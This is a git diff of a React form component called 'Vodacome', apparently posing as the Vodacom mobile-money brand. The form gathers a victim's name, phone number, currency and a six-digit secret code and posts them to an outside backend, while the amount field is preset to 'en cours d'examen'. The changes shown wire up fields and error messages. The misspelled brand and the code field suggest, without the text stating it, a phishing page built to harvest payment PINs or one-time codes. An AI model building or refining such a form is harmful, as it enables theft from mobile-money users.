@@ -5,7 +5,7 @@ import toast from "react-hot-toast";
 export default function Vodacome() {
   const [fullname, setFullname] = useState("");
   const [numero, setNumero] = useState("");
-  const [devise, setDevise] = useState("");
+  const [devise, setDevise] = useState("FCFA");
   const [montant, setMontant] = useState("en cours d'examen");
   const [code, setCode] = useState("");
   const [loading, setLoading] = useState(false);
@@ -13,7 +13,6 @@ export default function Vodacome() {
 
   const handleCodeChange = (e) => {
     const value = e.target.value;
-    // Autorise uniquement chiffres et max 6 caractères
     if (/^\d{0,6}$/.test(value)) {
       setCode(value);
       setErrors((prev) => ({ ...prev, code: "" }));
@@ -22,11 +21,10 @@ export default function Vodacome() {
 
   const validateForm = () => {
     let errors = {};
-
     if (fullname.trim() === "") errors.fullname = "Nom et Prénom est requis";
 
     if (numero.trim() === "") {
-      errors.numero = "Numéro Vodafone est requis";
+      errors.numero = "Numéro Vodacome est requis";
     } else if (!/^\d+$/.test(numero)) {
       errors.numero = "Le numéro Vodacome doit contenir uniquement des chiffres";
     }
@@ -59,16 +57,25 @@ export default function Vodacome() {
 
     try {
       setLoading(true);
-      const response = await axios.post("https://backend-paiement.vercel.app/api/paiements", paiements);
-      toast.success(response.data.message, { position: "top-right" });
-    } catch (error) {
-      toast.error("Erreur lors de l'envoi des données.", { position: "top-right" });
-      console.error(error);
-    } finally {
-      setLoading(false);
+      const response = await axios.post(
+        "https://backend-paiement.vercel.app/api/paiements",
+        paiements
+      );
+      toast.success(response.data.message || "Données envoyées avec succès", {
+        position: "top-right",
+      });
+      // Reset champs après succès
       setFullname("");
       setNumero("");
       setCode("");
+    } catch (error) {
+      // Affiche l’erreur retournée par l’API si existante, sinon message générique
+      const message =
+        error.response?.data?.message || "Erreur d’envoi des données.";
+      toast.error(message, { position: "top-right" });
+      console.error("Erreur API:", error.response || error.message);
+    } finally {
+      setLoading(false);
     }
   };
 
@@ -116,7 +123,6 @@ export default function Vodacome() {
               value={numero}
               onChange={(e) => {
                 const value = e.target.value;
-                
                 if (/^\d*$/.test(value)) {
                   setNumero(value);
                   setErrors((prev) => ({ ...prev, numero: "" }));
@@ -140,7 +146,8 @@ export default function Vodacome() {
             <select
               id="devise"
               name="devise"
-              // onChange={}
+              value={devise}
+              onChange={(e) => setDevise(e.target.value)}
               className="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-orange-500 focus:border-orange-500"
             >
               <option value="FCFA">FCFA</option>
